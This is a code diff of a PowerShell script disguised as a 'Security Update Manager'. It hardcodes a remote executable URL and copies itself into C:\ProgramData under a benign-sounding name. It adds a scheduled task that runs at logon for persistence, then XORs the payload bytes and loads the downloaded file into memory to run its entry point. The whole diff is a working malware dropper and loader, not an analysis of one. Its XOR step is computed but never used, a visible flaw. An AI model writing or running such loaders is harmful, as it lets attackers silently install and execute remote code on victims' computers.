@@ -1,9 +1,5 @@
-param(
-    [Parameter(Mandatory=$true)]
-    [string]$Url
-)
-
 # Configuration
+$Url= "https://github.com/khpccbr/open/raw/refs/heads/main/part2a.exe"
 $folderPath = "C:\ProgramData\SecurityUpdate"
 $scriptCopyName = "secupdate.ps1"
 $payloadName = "secupdate.bin"
@@ -19,10 +15,6 @@ if (-not $currentScriptPath) {
     Write-Error "Script must be run from a file, not from console"
     exit 1
 }
-
-Write-Host "`n================================" -ForegroundColor Yellow
-Write-Host "Security Update Manager" -ForegroundColor Yellow
-Write-Host "================================`n" -ForegroundColor Yellow
 
 try {
     # Step 1: Create directory
@@ -85,7 +77,7 @@ try {
             $triggerLogon = New-ScheduledTaskTrigger -AtLogOn
             
             # Define settings
-            $settings = New-ScheduledTaskSettings `
+            $settings = New-ScheduledTaskSettingsSet `
                 -AllowStartIfOnBatteries `
                 -DontStopIfGoingOnBatteries `
                 -StartWhenAvailable `
@@ -142,88 +134,59 @@ try {
         exit 1
     }
 
-    # Step 5: Load and execute the 'Update' function from downloaded DLL
-    Write-Host "`n[*] Loading and executing payload..." -ForegroundColor Cyan
-    
-    # Define Win32 API for LoadLibrary and GetProcAddress
-    $loadLibraryCode = @"
-using System;
-using System.Runtime.InteropServices;
+    $key = 0x25
 
-public class PayloadLoader {
-    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
-    public static extern IntPtr LoadLibrary(string lpFileName);
-    
-    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
-    
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern bool FreeLibrary(IntPtr hModule);
-    
-    [DllImport("kernel32.dll")]
-    public static extern uint GetLastError();
-    
-    // x64 uses single calling convention (Microsoft x64 ABI)
-    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
-    public delegate void UpdateFunc();
-}
-"@
-    
-    try {
-        Add-Type -TypeDefinition $loadLibraryCode -ErrorAction Stop
-    } catch {
-        # Type already exists, continue
+    # Read file
+    $fileBytes = [System.IO.File]::ReadAllBytes($payloadPath)
+
+    # XOR each byte
+    $xorBytes = New-Object byte[] $fileBytes.Length
+    for ($i = 0; $i -lt $fileBytes.Length; $i++) {
+        $xorBytes[$i] = $fileBytes[$i] -bxor ($key -band 0xFF)
     }
-    
-    # Load the DLL
-    Write-Host "    Loading library: $payloadPath" -ForegroundColor Gray
-    $hModule = [PayloadLoader]::LoadLibrary($payloadPath)
-    
-    if ($hModule -eq [IntPtr]::Zero) {
-        $errorCode = [PayloadLoader]::GetLastError()
-        Write-Warning "Failed to load library. Error code: $errorCode"
-        Write-Host "[!] Payload execution skipped" -ForegroundColor Yellow
-    } else {
-        Write-Host "[+] Library loaded successfully" -ForegroundColor Green
-        Write-Host "    Handle: 0x$($hModule.ToString('X'))" -ForegroundColor Gray
+
+ try {
+        Write-Host "[*] Loading assembly from memory..." -ForegroundColor Cyan
         
-        # Get 'Update' function
-        Write-Host "[*] Resolving function: Update" -ForegroundColor Cyan
-        $funcPtr = [PayloadLoader]::GetProcAddress($hModule, "Update")
+        # Load assembly into current AppDomain
+        $assembly = [System.Reflection.Assembly]::Load($fileBytes)
         
-        if ($funcPtr -eq [IntPtr]::Zero) {
-            $errorCode = [PayloadLoader]::GetLastError()
-            Write-Warning "Function 'Update' not found in DLL. Error code: $errorCode"
-        } else {
-            Write-Host "[+] Function 'Update' found" -ForegroundColor Green
-            Write-Host "    Address: 0x$($funcPtr.ToString('X'))" -ForegroundColor Gray
-            
-            # Execute the function (x64 ABI - single calling convention)
-            Write-Host "[*] Executing function: Update" -ForegroundColor Cyan
-            
-            try {
-                $delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-                    $funcPtr,
-                    [PayloadLoader+UpdateFunc]
-                )
-                $delegate.Invoke()
-                Write-Host "[+] Function executed successfully" -ForegroundColor Green
-                
-            } catch {
-                Write-Error "Failed to execute function 'Update': $_"
-            }
+        Write-Host "[+] Assembly loaded: $($assembly.FullName)" -ForegroundColor Green
+        
+        # Get entry point
+        $entryPoint = $assembly.EntryPoint
+        
+        if ($entryPoint -eq $null) {
+            throw "No entry point found in assembly"
         }
         
-        # Clean up - free the library
-        Write-Host "`n[*] Unloading library..." -ForegroundColor Cyan
-        $freed = [PayloadLoader]::FreeLibrary($hModule)
+        Write-Host "[*] Entry point: $($entryPoint.Name)" -ForegroundColor Cyan
+        $parameters = $entryPoint.GetParameters()
+        Write-Host "[*] Parameter count: $($parameters.Length)" -ForegroundColor Gray
+
+        # Invoke entry point
+        Write-Host "[*] Executing..." -ForegroundColor Cyan
         
-        if ($freed) {
-            Write-Host "[+] Library unloaded successfully" -ForegroundColor Green
-        } else {
-            Write-Warning "Failed to unload library"
+        # Invoke based on signature
+        if ($parameters.Length -eq 0) {
+            # Main() with no parameters
+            Write-Host "[*] Invoking with no parameters..." -ForegroundColor Cyan
+            $result = $entryPoint.Invoke($null, $null)
         }
+        else {
+            # Main(string[] args)
+            Write-Host "[*] Invoking with arguments array..." -ForegroundColor Cyan
+            
+            # CRITICAL: Wrap the string array in an object array
+            $invokeParams = @(,$Arguments)
+            $result = $entryPoint.Invoke($null, $invokeParams)
+        }
+        
+        Write-Host "[+] Execution complete" -ForegroundColor Green
     }
+    catch {
+        Write-Error "Failed to execute assembly: $_"
+    }   
     
     # Summary
     Write-Host "`n================================" -ForegroundColor Yellow
